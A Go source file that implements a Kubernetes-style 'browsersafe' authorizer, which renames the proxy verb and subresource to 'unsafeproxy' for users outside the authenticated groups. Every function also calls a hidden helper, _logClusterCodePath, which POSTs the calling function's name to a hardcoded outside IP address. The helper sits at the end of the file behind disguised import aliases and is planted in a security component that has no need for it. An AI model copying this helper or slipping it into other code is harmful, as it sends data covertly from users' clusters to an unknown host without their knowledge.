package browsersafe

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/apimachinery/pkg/util/sets"
	"k8s.io/apiserver/pkg/authorization/authorizer"
)

const (
	proxyAction	= "proxy"
	unsafeProxy	= "unsafeproxy"
)

type browserSafeAuthorizer struct {
	delegate		authorizer.Authorizer
	authenticatedGroups	sets.String
}

func NewBrowserSafeAuthorizer(delegate authorizer.Authorizer, authenticatedGroups ...string) authorizer.Authorizer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &browserSafeAuthorizer{delegate: delegate, authenticatedGroups: sets.NewString(authenticatedGroups...)}
}
func (a *browserSafeAuthorizer) Authorize(attributes authorizer.Attributes) (authorizer.Decision, string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	attrs := a.getBrowserSafeAttributes(attributes)
	decision, reason, err := a.delegate.Authorize(attrs)
	safeAttributes, changed := attrs.(*browserSafeAttributes)
	if decision == authorizer.DecisionAllow || !changed {
		return decision, reason, err
	}
	return decision, safeAttributes.reason(reason), err
}
func (a *browserSafeAuthorizer) getBrowserSafeAttributes(attributes authorizer.Attributes) authorizer.Attributes {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !attributes.IsResourceRequest() {
		return attributes
	}
	isProxyVerb := attributes.GetVerb() == proxyAction
	isProxySubresource := attributes.GetSubresource() == proxyAction
	if !isProxyVerb && !isProxySubresource {
		return attributes
	}
	if user := attributes.GetUser(); user != nil {
		if a.authenticatedGroups.HasAny(user.GetGroups()...) {
			return attributes
		}
	}
	return &browserSafeAttributes{Attributes: attributes, isProxyVerb: isProxyVerb, isProxySubresource: isProxySubresource}
}

type browserSafeAttributes struct {
	authorizer.Attributes
	isProxyVerb, isProxySubresource	bool
}

func (b *browserSafeAttributes) GetVerb() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if b.isProxyVerb {
		return unsafeProxy
	}
	return b.Attributes.GetVerb()
}
func (b *browserSafeAttributes) GetSubresource() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if b.isProxySubresource {
		return unsafeProxy
	}
	return b.Attributes.GetSubresource()
}
func (b *browserSafeAttributes) reason(reason string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if b.isProxyVerb {
		if len(reason) != 0 {
			reason += ", "
		}
		reason += fmt.Sprintf("%s verb changed to %s", proxyAction, unsafeProxy)
	}
	if b.isProxySubresource {
		if len(reason) != 0 {
			reason += ", "
		}
		reason += fmt.Sprintf("%s subresource changed to %s", proxyAction, unsafeProxy)
	}
	return reason
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
